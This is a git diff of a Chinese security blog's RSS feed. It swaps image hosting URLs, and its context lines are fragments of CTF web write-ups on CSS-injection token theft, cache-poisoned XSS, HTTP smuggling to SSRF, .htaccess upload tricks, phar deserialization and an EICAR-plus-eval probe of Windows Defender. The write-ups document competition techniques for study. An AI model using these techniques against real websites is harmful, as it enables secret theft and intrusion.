@@ -6949,7 +6949,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119004834.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119004834.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到我们这里收到了&lt;code>value^=&amp;quot;7&amp;quot;&lt;/code>选择器发来的请求，所以我们也可以i使用枚举思想来进行爆破获取 token1&lt;/p>
@@ -7326,7 +7326,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>效果如下图所示：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122947.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119122947.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="token1---same-origin">Token1 - Same Origin
@@ -7397,7 +7397,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">iframe&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://127.0.0.1:3000/token/78&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">iframe&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122446.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119122446.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里&lt;code>zedd.vv&lt;/code>映射到了 127.0.0.1 ，可以看到因为不同源，&lt;code>zedd.vv&lt;/code>是拿不到 iframe 的 cookie 的，而通过 127.0.0.1 访问 test.html ，因为服务对于 cookie 的设置存在&lt;code>Path=/&lt;/code>，所以我们能在父页面也能拿到 iframe 当中的 cookie&lt;/p>
@@ -7604,7 +7604,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119230534.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119230534.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>访问 test.html 之后我们可以看到收到了请求。&lt;/p>
@@ -8175,12 +8175,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>至于 width 为 500 px，是&lt;code>script&lt;/code>标签内内容长度，这个需要宽度也比较关键，因为 svg 中连字的构建也不是特比好构建，也就是如果无法构建好连字，也就无法弄出滚动条，也就无处触发我们构造的请求了。所以 iframe 的宽度并不是越宽越好&amp;hellip; svg horiz-adv-x 的参数也不是越大就能触发&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120012326.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120012326.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>如果按照原作者设置的 iframe width 为 40px，svg 连字 horiz-adv-x 参数为 1000 的话，就会出现如上情况。如果各位小伙伴去自己尝试一下就会发现，有一个很明显的 lightblue 颜色的瞬间，也就是 script 标签的颜色，个人认为因为浏览器渲染的顺序问题，先把在这个场景中长度为 463px 的 script 标签首先因为&lt;code>display:table&lt;/code>的原因，在网络请求字体之前首先被渲染了，所以会看到一条 lightblue 颜色带一闪而过，导致撑破了 iframe 设置的长度，也就产生了滚动条，随即触发了我们构造的请求，随后字体才会被浏览器进行渲染，然后将我们构造的其他字体设为 0 宽度。&lt;/p>
 &lt;p>而且还有一些问题就是缓存的问题，效果如下：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120013522.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120013522.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这也是原作者在原文提到的先发送一个请求让 chrome 缓存好字体的原因，但是这个方法及其不稳定&amp;hellip;用原作者的代码直接跑跑的结果也是五花八门，每次跑都不一样。&lt;/p>
@@ -8619,11 +8619,11 @@ loading="lazy"
 &lt;h1 id="noxss">NOXSS
 &lt;/h1>&lt;p>终于可以回到我们的题目了，其实走完以上流程，这个题目已经迎刃而解了，出题人出的点也正是 token2 的点。&lt;/p>
 &lt;p>随便注册一个账号之后，我们可以在 theme 参数发现有代码注入的地方，但是过滤了尖括号，我们可以用&lt;code>%0a&lt;/code>进行换行&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120133900.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120133900.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是我们的最终目的跟 token2 场景类似，还是拿到 script 标签中的 secret 变量&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120134348.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120134348.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>根据 token2 场景的解法，接下来我们至少需要做到可以执行我们任意 css 代码才行。&lt;/p>
@@ -8726,11 +8726,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里我用 php 简单模拟了题目环境，做起来比较简便，也比较开心&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002617.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191121002617.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>And&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002928.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191121002928.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>现场做出来的真是 CSS 带师 orz&amp;hellip;&lt;/p>
@@ -8748,7 +8748,7 @@ loading="lazy"
 >babyblog&lt;/a> 一致，有些功能还保留着，很有误导性&amp;hellip;以为是个升级版，前者是一道二次注入后用 php 正则&lt;code>/e&lt;/code>特性来执行命令的，所以我们一开始也就一直在日注入了&amp;hellip;&lt;/p>
 &lt;p>后来我发现&lt;code>/user&lt;/code>个人界面有 ip 记录，于是尝试 XFF 注入无果，但是可以把 XFF 直接回显到页面上。发现&lt;code>/server_status&lt;/code>，发现有大家的访问记录。陷入思考ing&amp;hellip;&lt;/p>
 &lt;p>队友突然看到有一个访问记录&lt;code>/user/1.css&lt;/code>（类似的这么一个路由，不太想得起来了），马上想到可能是缓存投毒，联想跟上文说的 XFF 的设置，想到可以缓存投毒将反射 xss 变成缓存 xss ，这样就可以打到 admin 了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109012449.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109012449.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="babypress">babypress
@@ -9056,11 +9056,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109024547.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109024547.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到在图中已经拿到了文件内容回显，所以当时我们就用这个 SSRF 拿到了 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109020248.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109020248.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="upload">upload
@@ -9245,10 +9245,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>虽然报错了但是我们依然上传成功了，直接访问那个路径即可。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109134834.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109134834.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109135000.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109135000.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="lfi2019">lfi2019
@@ -10120,7 +10120,7 @@ loading="lazy"
 >XCTF-2019-tfboys&lt;/a>&lt;/p>
 &lt;h1 id="conclusion">Conclusion
 &lt;/h1>&lt;p>体验极其好的一次比赛，非常感谢 @r3kapig 师傅们的精心准备，毫不夸张地说，这是本年度体验最好的一场比赛，无论从题目质量或者是从比赛过程的体验，都是非常棒的。希望国内以后更多一些这类的良心比赛！&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113235515.jpeg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113235515.jpeg"
 loading="lazy"
 >&lt;/p></description></item><item><title>Red Hat 2019 Web Write Up</title><link>https://zeddyu.github.io/p/red-hat-2019-web-write-up/</link><pubDate>Wed, 13 Nov 2019 15:18:06 +0000</pubDate><guid>https://zeddyu.github.io/p/red-hat-2019-web-write-up/</guid><description>&lt;p>红帽杯 2019 Web Write Up (除 iCloudMusic&lt;/p>
 &lt;p>[TOC]&lt;/p>
@@ -10301,7 +10301,7 @@ loading="lazy"
 &lt;/h2>&lt;p>&lt;strong>Second Blood&lt;/strong>&lt;/p>
 &lt;p>做的还是比较有意思的一题，可惜当时做的比较zz，本来可以一血，就是因为自己弄的太不小心了。&lt;/p>
 &lt;p>因为之前一直在研究 HTTP Smuggling 的东西，我在腾讯的导师也对这个挺感兴趣的，前阵子给我发了一个 Websocket Smuggling&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113011351.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113011351.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>看完后一脸懵逼，文章跟之前 Black Hat 2019 HTTP Desync 那个议题一样，只说了有这么个攻击面，但是没有说怎么产生的，但是还好给了 POC 以及一些 challs ，虽然我当时复现了一下，但是依然懵逼。&lt;/p>
@@ -10398,7 +10398,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>发现是个302跳转&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112113326.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191112113326.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>看来还是得起本地环境来试试看，刚好 &lt;a class="link" href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener"
@@ -10435,12 +10435,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>让我们试试看，把 burp 与文章 burp 拉到同样高度，然后 xml 标签之后随便弄几个 payload&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112180836.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191112180836.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我靠，简直一毛一样 XD&lt;/p>
 &lt;p>我感觉我要一血了，侧信道攻击真的牛批。然而正如上图，他喵的还是没回显啊&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112115732.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191112115732.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Emmm&amp;hellip;.陷入沉思&lt;/p>
@@ -10717,11 +10717,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/RDF&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000752.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113000752.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这样我们就成功构造了回显，然后用 smuggling 方法发送上面的请求就可以了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000857.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113000857.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>给比我做的快的师傅递茶tql，自己还是做的太慢了orz&amp;hellip;&lt;/p>
@@ -11089,7 +11089,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>XBM 文件竟然可以用&lt;code>#define&lt;/code>来规定图片的 width &amp;amp; height，而&lt;code>#&lt;/code>在&lt;code>.htaccess&lt;/code>文件中恰好是注释符，也不会引起解析错误，所以我们可以往这个方向去试一试。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190827155221.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190827155221.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>将 width &amp;amp; height 改成需要的数值，这样我们就可以上传&lt;code>.htaccess&lt;/code>了&lt;/p>
@@ -11149,11 +11149,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后再上传一个宽度高度符合要求的 xbm 文件即可。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190828023441.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190828023441.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然也可以使用其他编码啦，比如 utf-16，一种大端编码的方式，一个字符由两个字节编码，我们可以这么构造：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190830022019.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190830022019.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>exp.php 中的内容就是你想上传的 php 代码&lt;/p>
@@ -11347,7 +11347,7 @@ loading="lazy"
 &lt;/tbody>
 &lt;/table>
 &lt;p>还有这个 wbmp 的宽度高度格式有点奇怪，第三位是以 128 为基数算的，所以这里只能凑一下得到 1337 的高与宽&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190828165647.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190828165647.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里需要注意一下有个坑，直接提交的话还不知什么原因会自动加上&lt;code>0xefbf&lt;/code>污染了原数据，所以这里需要手动写脚本交一下。&lt;/p>
@@ -11589,7 +11589,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>直接传上去运行就行了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190830010343.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190830010343.png"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="ezphp">Ezphp
@@ -11764,7 +11764,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这时候&lt;code>/tmp/fl3g.php&lt;/code>当中的内容也是上面的内容，这时候&lt;code>.htaccess&lt;/code>因为我们访问了过一次&lt;code>index.php&lt;/code>被删除了，所以我们需要再写一次&lt;code>.htaccess&lt;/code>，还是一样的内容。&lt;/p>
 &lt;p>接着访问&lt;code>index.php&lt;/code>，可以看见我们包含的效果如下：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003155539.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003155539.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>之后我们就要思考怎么把一些恶意代码插到报错的内容当中了。&lt;/p>
@@ -11781,7 +11781,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>访问&lt;code>index.php&lt;/code>我们可以看到：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003160349.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003160349.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里&lt;code>&amp;lt;&lt;/code>被进行了 html 编码，所以我们这样去用&lt;code>include_path '/tmp'&lt;/code>包含的&lt;code>/tmp/fl3g.php&lt;/code>，自然也不可能执行代码。所以我们可能需要一些技巧来使得这些可以被解析。&lt;/p>
@@ -11824,7 +11824,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>访问&lt;code>index.php&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003163200.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003163200.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到 php-info&lt;/p>
@@ -12126,7 +12126,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以一步到位&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003191545.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003191545.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="reference">Reference
@@ -12180,7 +12180,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190911181803.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190911181803.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以发现我们并没有触发 Windows Defender，即使字符串是 EICAR 测试样本，说明了字符串不受 EICAR 特征影响。&lt;/p>
@@ -12195,7 +12195,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190911181841.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190911181841.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>没错，在保存的时候就立马触发了 Windows Defender ，足以验证当中有一个 Javascript Engine 进行了内容检测，而且即使没有完整的 Javascript 标签，也可以触发 Windows defender。&lt;/p>
@@ -12215,7 +12215,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100623.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912100623.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>非常棒，并没有被检测出恶意内容。&lt;/p>
@@ -12236,7 +12236,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100640.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912100640.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>也很棒，也没有检测出恶意内容。&lt;/p>
@@ -12259,7 +12259,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100648.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912100648.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Done! 触发了恶意内容检测。&lt;/p>
@@ -12282,7 +12282,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>a&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912103004.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912103004.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我们获取的是&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签中的第一个字符，也就是&lt;code>a&lt;/code>，不构成 EICAR 测试样本，所以触发不了 Windows Defender 也很正常。&lt;/p>
@@ -12305,7 +12305,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>*&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912103146.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912103146.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>很棒，意料之中地触发了 Windows Defender。&lt;/p>
@@ -12432,7 +12432,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span> &lt;span class="nx">num&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span> &lt;span class="p">}&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912130704.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912130704.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这样我们就可以通过“盲注”的方式获取&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签中的秘密数据了。&lt;/p>
@@ -13799,7 +13799,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个方法的缺点也比较明显，需要爆破&amp;hellip;于是我用 intruder 爆了一下，运气也比较好，5s 就出来了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190917021622.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190917021622.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="ezcms">EzCMS
@@ -14834,11 +14834,11 @@ loading="lazy"
 &lt;/h3>&lt;p>触发函数有了，那么接下里就是触发条件了。既然是与文件有关的函数均能触发 phar 反序列化，那么伪协议呢？&lt;/p>
 &lt;p>通过 @zsx 师傅的挖掘，发现基本上大多数 PHP stream 都可以通过 phar:// 来触发，但是就是没有提及 php:// 伪协议。&lt;/p>
 &lt;p>So，让我们用最常见的 &lt;code>php://filter/read=convert.base64-encode/resource=&lt;/code>试一下&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820121822.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820121822.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>好的，那么再看看文件包含如何&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820121956.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820121956.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>一点也不意外，我们可以通过 php://filter 来绕过一些开头限制进行 phar 反序列化&lt;/p>
@@ -14854,15 +14854,15 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>禁用了外部实体，虽然题目给出的反射类确实可以反射，而且也可以进行 XXE，也有过相关的 CTF题 &lt;a class="link" href="https://www.anquanke.com/post/id/170299#h2-2" target="_blank" rel="noopener"
 >Annoying class&lt;/a>，虽然控制了 /flag 读取权限，可是为什么还要禁用外部实体呢？难不成 XXE 也可以反序列化？&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820150125.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820150125.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Test.xml 中的内容就是上面 &lt;code>$xml&lt;/code>的内容&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820150346.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820150346.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然 php://filter 在这里也适用&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820150839.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820150839.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="mysql">Mysql
@@ -14912,7 +14912,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>其实也就是 @LoRexxar&amp;rsquo; 在 Tsec 上进行的分享 &lt;a class="link" href="https://paper.seebug.org/998/" target="_blank" rel="noopener"
 >Comprehensive analysis of the mysql client attack chain&lt;/a> 的内容了，@zsx 文章中指出&lt;/p>
